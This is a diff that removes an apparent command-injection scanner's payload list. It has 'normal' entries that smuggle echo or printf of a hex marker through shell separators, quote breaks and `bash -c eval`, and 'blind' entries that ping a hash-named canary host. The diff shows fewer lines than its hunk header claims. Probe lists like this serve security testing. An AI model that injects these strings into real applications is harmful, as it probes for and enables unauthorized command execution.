@@ -1,258 +1,258 @@
-Normal Payload: ; echo -e "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62"; 
-Normal Payload: ; echo -e "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62"; 
-Normal Payload: ; echo -e "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62" 2>&1; 
-Normal Payload: ; echo -e "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62" 2>&1; 
-Normal Payload:  && false || echo -e "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62" && 
-Normal Payload:  && false || echo -e "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62" && 
-Normal Payload:  && false || echo -e "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62" 2>&1 && 
-Normal Payload:  && false || echo -e "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62" 2>&1 && 
-Normal Payload: "; echo -e "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62"; "
-Normal Payload: "; echo -e "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62"; "
-Normal Payload: '; echo -e "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62"; '
-Normal Payload: '; echo -e "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62"; '
-Normal Payload: "; echo -e "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62" 2>&1; "
-Normal Payload: "; echo -e "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62" 2>&1; "
-Normal Payload: '; echo -e "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62" 2>&1; '
-Normal Payload: '; echo -e "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62" 2>&1; '
-Normal Payload: echo -e "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62"
-Normal Payload: echo -e "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62"
-Normal Payload: bash -c "$@" x eval echo -e "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62";
-Normal Payload: bash -c "$@" x eval echo -e "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62";
-Normal Payload: ; printf "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62"; 
-Normal Payload: ; printf "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62"; 
-Normal Payload: ; printf "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62" 2>&1; 
-Normal Payload: ; printf "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62" 2>&1; 
-Normal Payload:  && false || printf "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62" && 
-Normal Payload:  && false || printf "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62" && 
-Normal Payload:  && false || printf "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62" 2>&1 && 
-Normal Payload:  && false || printf "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62" 2>&1 && 
-Normal Payload: "; printf "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62"; "
-Normal Payload: "; printf "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62"; "
-Normal Payload: '; printf "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62"; '
-Normal Payload: '; printf "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62"; '
-Normal Payload: "; printf "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62" 2>&1; "
-Normal Payload: "; printf "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62" 2>&1; "
-Normal Payload: '; printf "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62" 2>&1; '
-Normal Payload: '; printf "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62" 2>&1; '
-Normal Payload: printf "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62"
-Normal Payload: printf "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62"
-Normal Payload: bash -c "$@" x eval printf "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62";
-Normal Payload: bash -c "$@" x eval printf "\\x30\\x64\\x31\\x66\\x63\\x64\\x65\\x34\\x39\\x37\\x33\\x62\\x36\\x39\\x38\\x32\\x39\\x38\\x39\\x64\\x64\\x30\\x31\\x33\\x37\\x36\\x65\\x66\\x37\\x31\\x38\\x37\\x30\\x32\\x36\\x65\\x61\\x62\\x36\\x36\\x30\\x61\\x65\\x32\\x66\\x30\\x66\\x64\\x62\\x64\\x64\\x34\\x38\\x36\\x32\\x36\\x34\\x62\\x36\\x37\\x63\\x36\\x66\\x62";
-Normal Payload: ; printf \0\d\1\f\c\d\e\4\9\7\3\b\6\9\8\2\9\8\9\d\d\0\1\3\7\6\e\f\7\1\8\7\0\2\6\e\a\b\6\6\0\a\e\2\f\0\f\d\b\d\d\4\8\6\2\6\4\b\6\7\c\6\f\b; 
-Normal Payload: ; printf \0\d\1\f\c\d\e\4\9\7\3\b\6\9\8\2\9\8\9\d\d\0\1\3\7\6\e\f\7\1\8\7\0\2\6\e\a\b\6\6\0\a\e\2\f\0\f\d\b\d\d\4\8\6\2\6\4\b\6\7\c\6\f\b; 
-Normal Payload: ; printf \0\d\1\f\c\d\e\4\9\7\3\b\6\9\8\2\9\8\9\d\d\0\1\3\7\6\e\f\7\1\8\7\0\2\6\e\a\b\6\6\0\a\e\2\f\0\f\d\b\d\d\4\8\6\2\6\4\b\6\7\c\6\f\b 2>&1; 
-Normal Payload: ; printf \0\d\1\f\c\d\e\4\9\7\3\b\6\9\8\2\9\8\9\d\d\0\1\3\7\6\e\f\7\1\8\7\0\2\6\e\a\b\6\6\0\a\e\2\f\0\f\d\b\d\d\4\8\6\2\6\4\b\6\7\c\6\f\b 2>&1; 
-Normal Payload:  && false || printf \0\d\1\f\c\d\e\4\9\7\3\b\6\9\8\2\9\8\9\d\d\0\1\3\7\6\e\f\7\1\8\7\0\2\6\e\a\b\6\6\0\a\e\2\f\0\f\d\b\d\d\4\8\6\2\6\4\b\6\7\c\6\f\b && 
-Normal Payload:  && false || printf \0\d\1\f\c\d\e\4\9\7\3\b\6\9\8\2\9\8\9\d\d\0\1\3\7\6\e\f\7\1\8\7\0\2\6\e\a\b\6\6\0\a\e\2\f\0\f\d\b\d\d\4\8\6\2\6\4\b\6\7\c\6\f\b && 
-Normal Payload:  && false || printf \0\d\1\f\c\d\e\4\9\7\3\b\6\9\8\2\9\8\9\d\d\0\1\3\7\6\e\f\7\1\8\7\0\2\6\e\a\b\6\6\0\a\e\2\f\0\f\d\b\d\d\4\8\6\2\6\4\b\6\7\c\6\f\b 2>&1 && 
-Normal Payload:  && false || printf \0\d\1\f\c\d\e\4\9\7\3\b\6\9\8\2\9\8\9\d\d\0\1\3\7\6\e\f\7\1\8\7\0\2\6\e\a\b\6\6\0\a\e\2\f\0\f\d\b\d\d\4\8\6\2\6\4\b\6\7\c\6\f\b 2>&1 && 
-Normal Payload: "; printf \0\d\1\f\c\d\e\4\9\7\3\b\6\9\8\2\9\8\9\d\d\0\1\3\7\6\e\f\7\1\8\7\0\2\6\e\a\b\6\6\0\a\e\2\f\0\f\d\b\d\d\4\8\6\2\6\4\b\6\7\c\6\f\b; "
-Normal Payload: "; printf \0\d\1\f\c\d\e\4\9\7\3\b\6\9\8\2\9\8\9\d\d\0\1\3\7\6\e\f\7\1\8\7\0\2\6\e\a\b\6\6\0\a\e\2\f\0\f\d\b\d\d\4\8\6\2\6\4\b\6\7\c\6\f\b; "
-Normal Payload: '; printf \0\d\1\f\c\d\e\4\9\7\3\b\6\9\8\2\9\8\9\d\d\0\1\3\7\6\e\f\7\1\8\7\0\2\6\e\a\b\6\6\0\a\e\2\f\0\f\d\b\d\d\4\8\6\2\6\4\b\6\7\c\6\f\b; '
-Normal Payload: '; printf \0\d\1\f\c\d\e\4\9\7\3\b\6\9\8\2\9\8\9\d\d\0\1\3\7\6\e\f\7\1\8\7\0\2\6\e\a\b\6\6\0\a\e\2\f\0\f\d\b\d\d\4\8\6\2\6\4\b\6\7\c\6\f\b; '
-Normal Payload: "; printf \0\d\1\f\c\d\e\4\9\7\3\b\6\9\8\2\9\8\9\d\d\0\1\3\7\6\e\f\7\1\8\7\0\2\6\e\a\b\6\6\0\a\e\2\f\0\f\d\b\d\d\4\8\6\2\6\4\b\6\7\c\6\f\b 2>&1; "
-Normal Payload: "; printf \0\d\1\f\c\d\e\4\9\7\3\b\6\9\8\2\9\8\9\d\d\0\1\3\7\6\e\f\7\1\8\7\0\2\6\e\a\b\6\6\0\a\e\2\f\0\f\d\b\d\d\4\8\6\2\6\4\b\6\7\c\6\f\b 2>&1; "
-Normal Payload: '; printf \0\d\1\f\c\d\e\4\9\7\3\b\6\9\8\2\9\8\9\d\d\0\1\3\7\6\e\f\7\1\8\7\0\2\6\e\a\b\6\6\0\a\e\2\f\0\f\d\b\d\d\4\8\6\2\6\4\b\6\7\c\6\f\b 2>&1; '
-Normal Payload: '; printf \0\d\1\f\c\d\e\4\9\7\3\b\6\9\8\2\9\8\9\d\d\0\1\3\7\6\e\f\7\1\8\7\0\2\6\e\a\b\6\6\0\a\e\2\f\0\f\d\b\d\d\4\8\6\2\6\4\b\6\7\c\6\f\b 2>&1; '
-Normal Payload: printf \0\d\1\f\c\d\e\4\9\7\3\b\6\9\8\2\9\8\9\d\d\0\1\3\7\6\e\f\7\1\8\7\0\2\6\e\a\b\6\6\0\a\e\2\f\0\f\d\b\d\d\4\8\6\2\6\4\b\6\7\c\6\f\b
-Normal Payload: printf \0\d\1\f\c\d\e\4\9\7\3\b\6\9\8\2\9\8\9\d\d\0\1\3\7\6\e\f\7\1\8\7\0\2\6\e\a\b\6\6\0\a\e\2\f\0\f\d\b\d\d\4\8\6\2\6\4\b\6\7\c\6\f\b
-Normal Payload: bash -c "$@" x eval printf \0\d\1\f\c\d\e\4\9\7\3\b\6\9\8\2\9\8\9\d\d\0\1\3\7\6\e\f\7\1\8\7\0\2\6\e\a\b\6\6\0\a\e\2\f\0\f\d\b\d\d\4\8\6\2\6\4\b\6\7\c\6\f\b;
-Normal Payload: bash -c "$@" x eval printf \0\d\1\f\c\d\e\4\9\7\3\b\6\9\8\2\9\8\9\d\d\0\1\3\7\6\e\f\7\1\8\7\0\2\6\e\a\b\6\6\0\a\e\2\f\0\f\d\b\d\d\4\8\6\2\6\4\b\6\7\c\6\f\b;
-Normal Payload:  & echo ^0^d^1^f^c^d^e^4^9^7^3^b^6^9^8^2^9^8^9^d^d^0^1^3^7^6^e^f^7^1^8^7^0^2^6^e^a^b^6^6^0^a^e^2^f^0^f^d^b^d^d^4^8^6^2^6^4^b^6^7^c^6^f^b & 
-Normal Payload:  & echo ^0^d^1^f^c^d^e^4^9^7^3^b^6^9^8^2^9^8^9^d^d^0^1^3^7^6^e^f^7^1^8^7^0^2^6^e^a^b^6^6^0^a^e^2^f^0^f^d^b^d^d^4^8^6^2^6^4^b^6^7^c^6^f^b & 
-Blind Payload: ; ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; 
-Blind Payload: ; ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; 
-Blind Payload: ; ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; 
-Blind Payload: ; ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1; 
-Blind Payload:  && false || ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb && 
-Blind Payload:  && false || ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb && 
-Blind Payload:  && false || ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1 && 
-Blind Payload:  && false || ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb 2>&1 && 
-Blind Payload: "; ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; "
-Blind Payload: "; ping -c 1 0d1fcde4973b6982989dd01376ef7187026eab660ae2f0fdbdd486264b67c6fb; "
